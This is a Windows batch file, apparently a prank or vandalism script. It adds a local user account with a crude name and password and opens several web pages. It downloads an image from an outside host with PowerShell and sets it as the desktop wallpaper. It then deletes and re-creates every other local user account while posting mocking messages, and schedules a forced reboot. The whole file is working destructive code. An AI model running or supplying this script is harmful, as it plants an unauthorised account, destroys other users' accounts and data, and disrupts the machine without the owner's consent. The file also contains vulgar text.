@echo off
set "wallpaper=%USERPROFILE%\Documents\giggitywallpaper.png"
net user "penis is the password" penis /add
start https://www.youtube.com/watch?v=GyYJV1psDow
start https://www.directv.com
msg * "https://www.youtube.com/watch?v=GyYJV1psDow&pp=sAQB"
powershell -Command "Invoke-WebRequest 'https://giggityfiles.github.io/giggitywallpaper.png' -OutFile '%wallpaper%'"
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wallpaper%" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
for /f "tokens=2 delims=\" %%a in ("%username%") do set currentUser=%%a
if not defined currentUser set currentUser=%username%
for /f "skip=1" %%u in ('wmic useraccount get name') do (
    set "user=%%u"
    setlocal enabledelayedexpansion
    set "trim=!user: =!"
    if not "!trim!"=="" if /i not "!trim!"=="%currentUser%" (
        msg * "!trim! has been eaten by banjo's anus"
        net user "!trim!" /delete
        net user "!trim!" /add
    )
    endlocal

    
)
shutdown /f /r /t 3600
exit
